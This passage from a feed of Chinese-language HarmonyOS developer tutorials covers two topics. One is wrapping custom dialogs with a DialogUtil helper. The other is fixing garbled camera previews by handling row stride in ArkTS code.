<li>进入案例，点击右上角筛选按钮，顶部弹出筛选框，点击一种文件类型进行筛选</li>
<li>点击左上角添加按钮，中间弹出新增文件弹框，输入文件名以及选择文件类型，点击确定按钮添加完毕</li>
<li>长按列表项出现弹窗，点击删除按钮，中间弹出删除确认框，点击确认按钮删除完毕</li>
<li>长按列表项出现弹窗，底部弹出文件详情弹框</li>
</ol>
<h3 data-id="heading-2">实现思路</h3>
<ol>
<li>
<p>定义弹窗的父布局builder,支持自定义弹窗内容传入，设置弹窗蒙层。</p>
<p>@Builder
export function DialogBuilder(param: EncapsulateDialogBuilderParam) {
Stack({ alignContent: getAlignment(param.dialogType) }) {
Stack()
.width('100%')
.height('300%')
.backgroundColor(0x33000000)
.onClick(() =&gt; {
if (param.isModalClosedByOverlayClick) {
param.closeDialog!();
}
})
param.builder.builder({ onConfirm: param.onConfirm, closeDialog: param.closeDialog, data: param.data })</p>
<p>}.width('100%')
.height('100%')
}</p>
</li>
<li>
<p>使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-arkui-uicontext-V13%23opencustomdialog12" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-arkui-uicontext-V13#opencustomdialog12" ref="nofollow noopener noreferrer">openCustomDialog</a>接口，该接口可支持传入builder。</p>
<p>public static showCustomDialog(param: DialogParam): void {
if (!DialogUtil.uiContext) {
return;
}
let promptAction = DialogUtil.uiContext.getPromptAction();
let encapsulateParam: EncapsulateDialogBuilderParam = DialogUtil.transformDialogParamToEncapsulateDialogBuilderParam(param);
let compCont = new ComponentContent(DialogUtil.uiContext, wrapBuilder(DialogBuilder), encapsulateParam);
// 设置了弹窗id即可将其与弹窗关联起来，后续可凭据弹窗id关闭弹窗
if (param.dialogId) {
DialogUtil.compContMap.set(param.dialogId, compCont);
}
DialogUtil.fillCancelMethod(encapsulateParam, promptAction, compCont, param.dialogId);
DialogUtil.fillConfirmMethod(encapsulateParam, promptAction, compCont, param.dialogId);
compCont.update(encapsulateParam);
let options: promptAction.BaseDialogOptions = DialogUtil.dealSlideToClose(param);
promptAction.openCustomDialog(compCont, options);
}</p>
</li>
<li>
<p>自定义关闭弹窗回调。</p>
<p>private static fillCancelMethod(param: EncapsulateDialogBuilderParam, promptAction: PromptAction,
compCont: ComponentContent, dialogId: string | undefined) {
let customCancel = param.closeDialog;
let cancelDialog = () =&gt; {
if (customCancel) {
customCancel();
}
if (dialogId) {
DialogUtil.compContMap.delete(dialogId);
}
promptAction.closeCustomDialog(compCont);
// 关闭弹框之后释放对应的ComponentContent
compCont.dispose();
};
param.closeDialog = cancelDialog;
}</p>
</li>
<li>
<p>自定义弹窗确认回调。</p>
<p>private static fillConfirmMethod(param: EncapsulateDialogBuilderParam, promptAction: PromptAction,
compCont: ComponentContent, dialogId: string | undefined) {
let confirm = param.onConfirm;
let confirmDialog = (isCloseDialog?: boolean, data?: ESObject) =&gt; {
if (confirm) {
confirm(isCloseDialog, data);
}
if (isCloseDialog) {
if (dialogId) {
DialogUtil.compContMap.delete(dialogId);
}
promptAction.closeCustomDialog(compCont);
compCont.dispose();
}
};
param.onConfirm = confirmDialog;
}</p>
</li>
<li>
<p>自定义弹窗弹出动效。</p>
<p>/**</p>
<ul>
<li>顶部弹出动画</li>
<li>@param duration 动画时间</li>
<li>@returns
*/
static transitionFromUp(duration: number = 200): TransitionEffect {
return TransitionEffect.asymmetric(
TransitionEffect.OPACITY.animation({ duration: duration }).combine(
TransitionEffect.move(TransitionEdge.TOP).animation({ duration: duration })),
TransitionEffect.OPACITY.animation({ delay: duration, duration: duration }).combine(
TransitionEffect.move(TransitionEdge.TOP).animation({ duration: duration }))
)
}</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">使用步骤</h3>
<ol>
<li>
<p>初始化DialogUtil，需调用其init方法将UIContext传入。</p>
<p>aboutToAppear(): void {
DialogUtil.init(this.getUIContext());
...
}</p>
</li>
<li>
<p>定义弹窗builder，该builder必须有且只有DialogBuilderParam参数。</p>
<p>@Builder
export function addFileDialogBuilder(param: DialogBuilderParam) {
AddFileComponent({ param: param })
}</p>
</li>
<li>
<p>定义弹窗封装组件，该组件内部必须有DialogBuilderParam参数且使用@Prop注解。</p>
<p>@Component
export struct AddFileComponent {
@Prop param: DialogBuilderParam;
...
}</p>
</li>
<li>
<p>以上就封装好了自定义弹窗，接下来使用只需要调用一下showCustomDialog方法,将对应弹窗封装的builder传入。</p>
<p>showFileInfo(item: FileItem) {
// 打开筛选弹窗
DialogUtil.showCustomDialog({
builder: wrapBuilder(fileInfoDialogBuilder),
dialogType: DialogTypeEnum.BOTTOM,
dialogBuilderParam: {
data: item
}
})
}</p>
</li>
</ol>
<h4 data-id="heading-4">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-5">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b7e6a0503ed40b7909b9d58825b4ed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621950&amp;x-signature=wOj5kIfaCYYQjjlfmLGWq%2BtbrjM%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：相机预览花屏问题解决案例]]></title>    <link>https://juejin.cn/post/7589159665856167955</link>    <guid>https://juejin.cn/post/7589159665856167955</guid>    <pubDate>2025-12-29T14:09:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665856167955" data-draft-id="7589126217250816041" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：相机预览花屏问题解决案例"/> <meta itemprop="keywords" content="前端,HarmonyOS,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:09:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：相机预览花屏问题解决案例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:09:52.000Z" title="Mon Dec 29 2025 14:09:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">介绍</h3>
<p>本示例用于开发者在<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-guides-V5%2Fcamera-kit-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/camera-kit-V5" ref="nofollow noopener noreferrer">使用相机服务</a>时，如果仅用于预览流展示，通常使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V5%2Fts-basic-components-xcomponent-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V5/ts-basic-components-xcomponent-V5" ref="nofollow noopener noreferrer">XComponent</a>组件实现，如果需要获取每帧图像做二次处理（例如获取每帧图像完成二维码识别或人脸识别场景），可以通过<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V5%2Fjs-apis-image-V5%23imagereceiver9" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V5/js-apis-image-V5#imagereceiver9" ref="nofollow noopener noreferrer">ImageReceiver</a>中imageArrival事件监听预览流每帧数据，解析图像内容。在解析图像内容时，如果未考虑stride，直接通过使用width*height读取图像内容去解析图像，会导致相机预览异常，从而出现相机预览花屏的现象。当预览流图像stride与width不一致时，需要对stride进行无效像素的去除处理。</p>
<h3 data-id="heading-1">效果图预览</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc827fc537ed4b59845fff6c5ccfa309~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767622192&amp;x-signature=Fi3n%2BLGiXAl5m2%2BFyYmi%2F2guC7c%3D" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<ol>
<li>本案例仅支持真机验证，因在案例集合中导致权限弹窗reason只支持一种string。</li>
<li>点击进入案例，授权给相机。</li>
<li>三个方案滑动页面不会出现花屏。</li>
<li>点击相机右上角方案说明，可出现相关方案的具体描述。</li>
</ol>
<h3 data-id="heading-2">实现思路</h3>
<p>本例涉及的关键特性和实现方案如下：</p>
<h4 data-id="heading-3">方案一</h4>
<ol>
<li>
<p>应用通过image.ImageReceiver注册imageArrival图像回调方法，获取每帧图像数据实例image.Image，应用通过定义一个width为1920*height为1080分辨率的预览流直接创建pixelMap，此时获取到的stride的值为1920。</p>
<p>onImageArrival(receiver: image.ImageReceiver): void {
receiver.on('imageArrival', () =&gt; {
receiver.readNextImage((err: BusinessError, nextImage: image.Image) =&gt; {
if (err || nextImage === undefined) {
logger.error(TAG, <code>requestPermissionsFromUser call Failed! error: ${err.code}</code>);
return;
}
if (nextImage) {
nextImage.getComponent(image.ComponentType.JPEG, async (_err, component: image.Component) =&gt; {
let width = 1920; // width为应用创建预览流分辨率对应的宽
let height = 1080; // height为应用创建预览流分辨率对应的高
let stride = component.rowStride; // 通过component.rowStride获取stride
logger.info(TAG, <code>receiver getComponent width:${width} height:${height} stride:${stride}</code>);
// stride和width相等，按宽读取buffer不影响结果
if (stride === width) {
let pixelMap = await image.createPixelMap(component.byteBuffer, {
size: { height: height, width: width },
srcPixelFormat: image.PixelMapFormat.NV21,
})
AppStorage.setOrCreate('stridePixel', pixelMap);
} else {
...
}
nextImage.release();
})
}
});
})
}</p>
</li>
<li>
<p>在初始相机模块时，调用onImageArrival()，将未处理的width和height作为size，创建PixelMap，通过在Image中传入被@StorageLink修饰的变量stridePixel进行数据刷新，图片送显。</p>
<p>Column() {
Stack() {
if (this.isShowStridePixel) {
Image(this.stridePixel)
.rotate({
z: 0.5,
angle: this.previewRotate
})
.zIndex(0)
}
}
.width(px2vp(this.imageWidth))
.height(px2vp(this.imageHeight))
}
.onVisibleAreaChange([0.0, 1.0], (isVisible: boolean, _currentRation: number) =&gt; {
// 切换组件时清除不可见的页面信息，重新进入组件时重新进入相机
if (isVisible) {
CameraServiceCrop.initCamera(this.cameraDeviceIndex);
} else {
CameraServiceCrop.releaseCamera();
}
})</p>
</li>
<li>
<p>当stride和width相等时，按宽读取buffer不影响结果。 当stride和width不等时，如果应用想使用byteBuffer预览流数据创建pixelMap直接显示，可以根据stride*height字节的大小先创建pixelMap，然后调用PixelMap的cropSync方法裁剪掉多余的像素，从而正确处理stride，解决预览流花屏问题。</p>
<p>onImageArrival(receiver: image.ImageReceiver): void {
receiver.on('imageArrival', () =&gt; {
receiver.readNextImage((err: BusinessError, nextImage: image.Image) =&gt; {
if (err || nextImage === undefined) {
logger.error(TAG, <code>requestPermissionsFromUser call Failed! error: ${err.code}</code>);
return;
}
if (nextImage) {
nextImage.getComponent(image.ComponentType.JPEG, async (_err, component: image.Component) =&gt; {
let width = 1920; // width为应用创建预览流分辨率对应的宽
let height = 1080; // height为应用创建预览流分辨率对应的高
let stride = component.rowStride; // 通过component.rowStride获取stride
logger.info(TAG, <code>receiver getComponent width:${width} height:${height} stride:${stride}</code>);
// stride和width相等，按宽读取buffer不影响结果
if (stride === width) {
...
} else {
let pixelMap = await image.createPixelMap(component.byteBuffer, {
// 1.创建PixelMap时width传stride。
size: { height: height, width: stride },
srcPixelFormat: 8,
})
// 2.然后调用PixelMap的cropSync方法裁剪掉多余的像素。
pixelMap.cropSync({
size: { width: width, height: height },
x: 0,
y: 0
}) // 根据输入的尺寸裁剪图片,从(0,0)开始，裁剪width*height字节的区域。
let pixelBefore: PixelMap | undefined = AppStorage.get('stridePixel');
await pixelBefore?.release();
AppStorage.setOrCreate('stridePixel', pixelMap);
}
nextImage.release();
})
}
});
})
}</p>
</li>
</ol>
<h4 data-id="heading-4">方案二</h4>
<ol>
<li>
<p>方案二的创建pixelMap、图片送显和方案一的1、2步骤一样，此处不再赘述。</p>
<p>当stride和width相等时，按宽读取buffer不影响结果。 当stride和width不等时，将相机返回的预览流数据即component.byteBuffer的数据去除stride，拷贝得到新的dstArr数据进行数据处理，将处理后的dstArr数组buffer，通过width和height直接创建pixelMap, 并存储到全局变量stridePixel中，传给Image送显，解决预览流花屏问题。</p>
<p>onImageArrival(receiver: image.ImageReceiver): void {
receiver.on('imageArrival', () =&gt; {
receiver.readNextImage((err: BusinessError, nextImage: image.Image) =&gt; {
if (err || nextImage === undefined) {
logger.error(TAG, <code>requestPermissionsFromUser call Failed! error: ${err.code}</code>);
return;
}
if (nextImage) {
nextImage.getComponent(image.ComponentType.JPEG,
async (err, component: image.Component) =&gt; {
let width = 1920; // width为应用创建预览流分辨率对应的宽
let height = 1080; // height为应用创建预览流分辨率对应的高
let stride = component.rowStride; // 通过component.rowStride获取stride
logger.info(TAG, <code>receiver getComponent width:${width} height:${height} stride:${stride}</code>);
// 当图片的width等于相机预览流返回的行跨距stride，此时无需处理stride，通过width和height直接创建pixelMap,并存储到全局变量stridePixel中，传给Image送显。
if (stride === width) {
...
} else {
// 当图片的width不等于相机预览流返回的行跨距stride，此时将相机返回的预览流数据component.byteBuffer去除掉stride，拷贝得到新的dstArr数据，数据处理后传给其他不支持stride的接口处理。
const dstBufferSize = width * height * 1.5; // 创建一个width * height * 1.5的dstBufferSize空间，此处为NV21数据格式。
const dstArr = new Uint8Array(dstBufferSize); // 存放去掉stride后的buffer。
// 读取每行数据，相机支持的profile宽高均为偶数，不涉及取整问题。
for (let j = 0; j &lt; height * 1.5; j++) { // 循环dstArr的每一行数据。
// 拷贝component.byteBuffer的每行数据前width个字节到dstArr中(去除无效像素，刚好每行得到一个width<em>height的八字节数组空间)。
const srcBuf = new Uint8Array(component.byteBuffer, j * stride,
width); // 将component.byteBuffer返回的buffer，每行遍历，从首位开始，每行截取出width字节。
dstArr.set(srcBuf, j * width); // 将width</em>height大小的数据存储到dstArr中。
}
let pixelMap = await image.createPixelMap(dstArr.buffer, {
// 将处理后的dstArr数组buffer，通过width和height直接创建pixelMap,并存储到全局变量stridePixel中，传给Image送显。
size: { height: height, width: width },
srcPixelFormat: image.PixelMapFormat.NV21,
})
AppStorage.setOrCreate('stridePixel', pixelMap);
}
nextImage.release();
})
}
});
})
}</p>
</li>
</ol>
<h4 data-id="heading-5">方案三</h4>
<ol>
<li>
<p>使用XComponent渲染预览对象输出的图像。</p>
<p>Stack() {
XComponent({
type: XComponentType.SURFACE,
controller: this.xComponentCtl
})
.onLoad(async () =&gt; {
logger.info('onLoad is called');
this.xComponentSurfaceId = this.xComponentCtl.getXComponentSurfaceId(); // 获取组件surfaceId
// 初始化相机，组件实时渲染每帧预览流数据
CameraService.initCamera(this.cameraDeviceIndex, this.xComponentSurfaceId);
})
.zIndex(0)</p>
<p>PublishView({ imageWidth: this.imageWidth, imageHeight: this.imageHeight })
.zIndex(1)</p>
<p>}
.onVisibleAreaChange([0.0, 1.0], (isVisible: boolean, _currentRation: number) =&gt; {
if (isVisible) {
CameraService.initCamera(this.cameraDeviceIndex, this.xComponentSurfaceId);
} else {
CameraService.releaseCamera();
}
})</p>
</li>
<li>
<p>在初始相机模块时，使用getXComponentSurfaceId获取XComponent对应Surface的ID，调用createPreviewOutput创建预览输出对象，图片送显。</p>
<p>async initCamera(cameraDeviceIndex: number, xComponentSurfaceId: string): Promise {
logger.debug(TAG, <code>initCamera cameraDeviceIndex: ${cameraDeviceIndex}</code>);
try {
await this.releaseCamera();
// 获取相机管理器实例
this.cameraManager = this.getCameraManagerFn();
if (this.cameraManager === undefined) {
logger.error(TAG, 'cameraManager is undefined');
return;
}
this.cameras = this.getSupportedCamerasFn(this.cameraManager);
this.curCameraDevice = this.cameras[cameraDeviceIndex];
if (this.curCameraDevice === undefined) {
logger.error(TAG, 'Failed to create the camera input.');
return;
}
// 创建cameraInput输出对象
this.cameraInput = this.createCameraInputFn(this.cameraManager, this.curCameraDevice);
if (this.cameraInput === undefined) {
logger.error(TAG, 'Failed to create the camera input.');
return;
}
// 打开相机
let isOpenSuccess = await this.cameraInputOpenFn(this.cameraInput);
if (!isOpenSuccess) {
logger.error(TAG, 'Failed to open the camera.');
return;
}</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 选择具有不同的stride和width</span>
let previewProfile: camera.Profile = {
  format: camera.CameraFormat.CAMERA_FORMAT_YUV_420_SP,
  size: {
    width: Constants.X_COMPONENT_SURFACE_WIDTH,
    height: Constants.X_COMPONENT_SURFACE_HEIGHT
  }
};
let size: image.Size = {
  width: Constants.X_COMPONENT_SURFACE_WIDTH,
  height: Constants.X_COMPONENT_SURFACE_HEIGHT
}
<span class="hljs-keyword">this</span>.receiver = image.createImageReceiver(size, image.ImageFormat.JPEG, <span class="hljs-number">8</span>);
<span class="hljs-keyword">this</span>.previewOutput = <span class="hljs-keyword">this</span>.createPreviewOutputFn(<span class="hljs-keyword">this</span>.cameraManager, previewProfile, xComponentSurfaceId);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.previewOutput === undefined) {
  logger.error(TAG, <span class="hljs-string">'Failed to create the preview stream.'</span>);
  <span class="hljs-keyword">return</span>;
}
<span class="hljs-comment">// 会话流</span>
await <span class="hljs-keyword">this</span>.sessionFlowFn(<span class="hljs-keyword">this</span>.cameraManager, <span class="hljs-keyword">this</span>.cameraInput, <span class="hljs-keyword">this</span>.previewOutput);
</code></pre>
<p>} catch (error) {
logger.error(TAG, <code>initCamera fail: ${JSON.stringify(error)}</code>);
}
}</p>
</li>
</ol>
<h4 data-id="heading-6">注意</h4>
<p>本示例未设置成全屏状态，开发者可通过设置宽或高为100%，再根据当前设备的像素比设置aspectRatio(宽/高)，例如Mate60可设置为aspectRatio(9/16)。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">Stack</span>() {
  if (this.isShowStridePixel) {
    <span class="hljs-built_in">Image</span>(this.stridePixel)
      <span class="hljs-selector-class">.rotate</span>({
        z: <span class="hljs-number">0.5</span>,
        angle: this.previewRotate
      })
      <span class="hljs-selector-class">.zIndex</span>(<span class="hljs-number">0</span>)
  }
}
<span class="hljs-selector-class">.width</span>('<span class="hljs-number">100%</span>')
<span class="hljs-selector-class">.aspectRatio</span>(<span class="hljs-number">9</span>/<span class="hljs-number">16</span>)
</code></pre>
<h4 data-id="heading-7">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-8">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d7334235632406a98b7fd0f5c633ef2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767622192&amp;x-signature=WRHXBvwkT98VRCa1h2npt2nOac4%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：多重筛选]]></title>    <link>https://juejin.cn/post/7589159665856200723</link>    <guid>https://juejin.cn/post/7589159665856200723</guid>    <pubDate>2025-12-29T14:13:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665856200723" data-draft-id="7589126217250832425" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：多重筛选"/> <meta itemprop="keywords" content="HarmonyOS,Android,程序员"/> <meta itemprop="datePublished" content="2025-12-29T14:13:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：多重筛选
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:13:51.000Z" title="Mon Dec 29 2025 14:13:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
